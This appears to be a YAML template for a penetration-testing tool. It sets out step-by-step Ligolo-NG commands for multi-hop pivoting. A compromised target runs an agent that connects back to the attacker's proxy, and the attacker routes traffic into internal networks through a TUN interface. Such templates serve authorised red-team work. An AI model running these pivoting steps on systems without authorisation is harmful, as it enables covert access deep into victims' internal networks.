id: ligolo-ng
name: Ligolo-NG Multi-Pivot
description: >
  TUN-based pivoting tool using a lightweight agent and proxy model.
  Supports chained (multi-hop) pivoting with explicit execution order
  for attacker and compromised hosts.

category: tun

os:
  attacker:
    - linux
  target:
    - linux
    - windows

requires_root: true

inputs:
  attacker_ip:
    label: Attacker IP
    type: ip
    required: true

  attacker_bind_ip:
    label: Proxy Bind IP
    type: ip
    default: 0.0.0.0

  attacker_port:
    label: Proxy Port
    type: port
    default: 11601

  tun_name:
    label: TUN Interface Name
    type: string
    default: ligolo1

  pivot_network:
    label: Pivot Network IP
    type: ip
    required: true

  pivot_cidr:
    label: Pivot Network CIDR
    type: cidr
    default: 24

  listener_port:
    label: Relay Listener Port
    type: port
    default: 11601

execution:
  - step: 1
    host: attacker
    command: ip tuntap add user $(whoami) mode tun {{tun_name}}

  - step: 2
    host: attacker
    command: ip link set {{tun_name}} up

  - step: 3
    host: attacker
    command: ip route add {{pivot_network}}/{{pivot_cidr}} dev {{tun_name}}

  - step: 4
    host: attacker
    command: ./ligolo-proxy -selfcert -laddr {{attacker_bind_ip}}:{{attacker_port}}

  - step: 5
    host: target
    command: ./ligolo-agent -connect {{attacker_ip}}:{{attacker_port}} -ignore-cert

  - step: 6
    host: attacker
    command: ligolo-ng session

  - step: 7
    host: attacker
    command: start --tun {{tun_name}}

pivot_extensions:
  listener:
    command: listener_add --addr 0.0.0.0:{{listener_port}} --to 127.0.0.1:{{attacker_port}} --tcp

notes:
  - One TUN interface is required per pivot depth.
  - Each new pivot repeats the same execution order with new parameters.
  - Listener must be created before connecting the next agent.


# Input Requirement for each pivot level
# Entry Pivot (TUN)
# - attackerPort = yes and default 11601 
# - attackerOS = yes and default Linux 
# - attackerBindIP = yes and default 0.0.0.0 
# - network = yes and no default value
# - cidr = yes and default 24
# - targetPort = No
# - targetIP = No
# - targetOS = yes

# Relay Pivots
# - attackerPort = yes and default attackerPort + 1 
# - attackerOS = No - already known in entry
# - attackerBindIP = No not required ( 127.0.0.1 default in the command)
# - network = yes and no default value
# - cidr = yes and default 24
# - targetPort = yes and no default value
# - targetIP = yes 
# - targetOS = yes
